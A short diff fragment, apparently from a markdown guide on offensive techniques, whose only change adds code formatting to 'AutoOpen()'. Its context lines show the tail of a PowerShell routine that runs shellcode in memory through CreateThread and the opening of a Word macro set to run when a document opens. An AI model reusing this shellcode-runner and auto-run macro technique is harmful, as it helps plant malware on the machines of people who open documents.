@@ -77,7 +77,7 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
 
-Add this to a Microsoft Word Macro AutoOpen():
+Add this to a Microsoft Word Macro `AutoOpen()`:
 ```vb
 Sub MyMacro()
   Dim str As String
